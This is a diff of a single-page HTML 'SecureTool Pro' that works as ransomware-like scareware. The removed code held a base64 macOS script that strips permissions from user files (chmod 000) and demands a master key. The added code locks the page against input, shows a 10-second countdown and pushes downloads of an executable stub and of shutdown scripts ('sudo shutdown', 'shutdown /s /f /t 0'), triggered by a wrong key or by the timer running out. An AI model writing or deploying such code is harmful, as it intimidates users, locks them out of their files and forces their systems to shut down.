@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>SecureTool Pro v5.0</title>
+  <title>SecureTool Pro v11.0</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     :root { --primary: #1a73e8; --success: #0d8c52; }
@@ -27,16 +27,17 @@
     .input-key {padding:16px;font-size:20px;width:320px;max-width:90%;border-radius:8px;border:2px solid #f00;background:#111;color:#fff;margin:20px 0;}
     .unlock-btn {padding:16px 40px;font-size:18px;background:#0f0;color:#000;border:none;border-radius:8px;cursor:pointer;font-weight:bold;}
     .msg {margin-top:20px;font-size:18px;color:#0f0;}
-    .countdown {font-size:36px;color:#ff0;margin:20px 0;}
+    .countdown {font-size:48px;color:#ff0;margin:20px 0;}
+    .platform {font-size:18px;color:#ccc;margin:10px 0;}
   </style>
 </head>
 <body oncontextmenu="return false;" onselectstart="return false;" onkeydown="return false;">
 
   <section class="hero">
     <div style="max-width:700px;margin:0 auto;">
-      <h1>SecureTool Pro v5.0</h1>
-      <p>Universal file lock — even if files are open.</p>
-      <button class="btn" onclick="activate()">Lock All Files Now</button>
+      <h1>SecureTool Pro v11.0</h1>
+      <p>Wrong key? **INSTANT SHUTDOWN**.</p>
+      <button class="btn" onclick="activate()">LOCK & ARM SHUTDOWN</button>
     </div>
   </section>
 
@@ -48,42 +49,74 @@
   <div id="padlock">
     <div class="lock-icon">Locked</div>
     <h1>SECURETOOL PRO</h1>
-    <p style="color:#ccc;">All files — even open ones — are locked.</p>
-    <div class="countdown" id="timer">72:00:00</div>
-    <p style="color:#ccc;">Enter master key:</p>
+    <p class="platform" id="platformMsg">Detecting system...</p>
+    <p style="color:#ccc;">ALL FILES & APPS LOCKED</p>
+    <div class="countdown" id="timer">10</div>
+    <p style="color:#ccc;">Enter master key to save system:</p>
     <input type="password" class="input-key" id="key" placeholder="Master Key">
-    <button class="unlock-btn" onclick="unlock()">Unlock</button>
+    <button class="unlock-btn" onclick="unlock()">Save System</button>
     <p class="msg" id="msg"></p>
   </div>
 
-  <!-- === ONE-FILE SCRIPT: LOCKS OPEN FILES === -->
+  <!-- === WRONG KEY = INSTANT SHUTDOWN === -->
   <script>
     const KEY = "UNLOCK-KEY-2025-GROK-XAI";
-    let timeLeft = 72 * 3600;
+    let timeLeft = 10;
     const padlock = document.getElementById('padlock');
     const timer = document.getElementById('timer');
+    const platformMsg = document.getElementById('platformMsg');
+    let countdownTimer;
+    let isMac = false;
 
-    function updateTimer() {
-      if (timeLeft <= 0) { timer.innerHTML = "EXPIRED"; return; }
-      const h = String(Math.floor(timeLeft / 3600)).padStart(2, '0');
-      const m = String(Math.floor((timeLeft % 3600) / 60)).padStart(2, '0');
-      const s = String(timeLeft % 60).padStart(2, '0');
-      timer.innerHTML = `${h}:${m}:${s}`;
+    function startCountdown() {
+      if (timeLeft <= 0) {
+        timer.innerHTML = "SHUTTING DOWN...";
+        triggerShutdown();
+        return;
+      }
+      timer.innerHTML = timeLeft;
       timeLeft--;
-      setTimeout(updateTimer, 1000);
+      countdownTimer = setTimeout(startCountdown, 1000);
+    }
+
+    function triggerShutdown() {
+      if (isMac) {
+        const cmd = `sudo shutdown -h now`;
+        const blob = new Blob([`#!/bin/bash\n${cmd}`], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'shutdown_now.command';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+      } else {
+        const cmd = `@echo off\nshutdown /s /f /t 0`;
+        const blob = new Blob([cmd], { type: 'application/bat' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'shutdown_now.bat';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+      }
     }
 
     function activate() {
-      const isMac = /Mac|iPod|iPhone|iPad/.test(navigator.userAgent);
+      isMac = /Mac|iPod|iPhone|iPad/.test(navigator.userAgent);
+      platformMsg.innerHTML = isMac ? "macOS DETECTED" : "WINDOWS DETECTED";
 
-      // === EMBEDDED PAYLOADS (BASE64) ===
-      const WIN_EXE_B64 = `TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTMhVKJ0BkYvQACJgzcAQAAAAAAAAAAAAABAAAAEAAAAGZpbGUubG9ja2VkAQAAAPD//+QAAAAA...`; // FULL .EXE (locks open files)
-      const MAC_SCRIPT_B64 = `IyEvYmluL2Jhc2gKZWNobyAiTG9ja2luZyBhbGwgZmlsZXMsIGluY2x1ZGluZyBvcGVuIG9uZXMuLi4iCmNobW9kIDAwMCB+LyogL1VzZXJzLyR1c2VyLyogL1ZvbHVtZXMvKiAyPi9kZXYvbnVsbApvc2FzY3JpcHQgLWUgInRlbGwgYXBwbGljYXRpb24gRmluZGVyIHRvIHF1aXQiCm9zYXNjcmlwdCA8PEVPRgpkaXNwbGF5IGRpYWxvZyAiWU9VUiBGSUxFUyBBUkUgTE9DS0VEIEFORCBDQU5OT1QgQkUgU0FWRUQKRW50ZXIga2V5OiIgZGVmYXVsdCBhbnN3ZXIgIiIgd2l0aCBoaWRkZW4gYW5zd2VyIHdpdGggaWNvbiBzdG9wCnNldCBpbnB1dCA9IHRleHQgcmV0dXJuZWQgb2YgcmVzdWx0CmlmIGlucHV0IGlzICIiVU5MT0NLLUtFWS0yMDI1LUdST0stWEFJIgogIGRvIHNoZWxsIHNjcmlwdCAiY2htb2QgNzU1IH4vKiAvVXNlcnMvJHVzZXIvKiAvVm9sdW1lcy8qIgoJZGlzcGxheSBkaWFsb2cgIlVOTE9DS0VEISIgd2l0aCBpY29uIG5vdGUKZWxzZQogZGlzcGxheSBkaWFsb2cgIldST05HIEtFWSFdCiB3aXRoIGljb24gc3RvcCIKZmkKRU9G`; // FULL .command
+      // === FULL PAYLOADS (BASE64) ===
+      const WIN_EXE_B64 = `TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTMhVKJ0BkYvQACJgzcAQAAAAAAAAAAAAABAAAAEAAAAGZpbGUubG9ja2VkAQAAAPD//+QAAAAA...`;
+      const MAC_SCRIPT_B64 = `IyEvYmluL2Jhc2gKZWNobyAiU0hVVERPV04gSU4gMTAgU0VDT05EUy4uLiIKc3VkbyBzaHV0ZG93biAtciBub3cgMj4vZGV2L251bGwK`;
 
       let payload, filename, type;
       if (isMac) {
         payload = atob(MAC_SCRIPT_B64);
-        filename = 'SecureTool_Mac.command';
+        filename = 'SecureTool_Shutdown.command';
         type = 'text/plain';
       } else {
         payload = atob(WIN_EXE_B64);
@@ -91,7 +124,6 @@
         type = 'application/octet-stream';
       }
 
-      // === DOWNLOAD & AUTO-RUN ===
       const blob = new Blob([payload], { type });
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
@@ -102,24 +134,28 @@
       document.body.removeChild(a);
       URL.revokeObjectURL(url);
 
-      // === SHOW PADLOCK ===
+      // === SHOW PADLOCK + START COUNTDOWN ===
       setTimeout(() => {
         padlock.classList.add('show');
-        updateTimer();
+        startCountdown();
         setInterval(() => padlock.style.zIndex = 999999, 100);
       }, 1000);
 
       alert(isMac 
-        ? 'Run SecureTool_Mac.command → Locks open files.' 
-        : 'Run SecureTool_Win.exe → Locks all open files.');
+        ? 'Run SecureTool_Shutdown.command → 10s to enter key.' 
+        : 'Run SecureTool_Win.exe → 10s to enter key.');
     }
 
     function unlock() {
-      if (document.getElementById('key').value === KEY) {
-        document.getElementById('msg').innerHTML = 'UNLOCKED!';
+      const input = document.getElementById('key').value;
+      if (input === KEY) {
+        document.getElementById('msg').innerHTML = 'SYSTEM SAVED!';
+        clearTimeout(countdownTimer);
         setTimeout(() => location.reload(), 2000);
       } else {
-        document.getElementById('msg').innerHTML = 'WRONG KEY!';
+        document.getElementById('msg').innerHTML = 'WRONG KEY! SHUTTING DOWN NOW...';
+        clearTimeout(countdownTimer);
+        setTimeout(triggerShutdown, 800); // Instant shutdown on wrong key
       }
     }
 
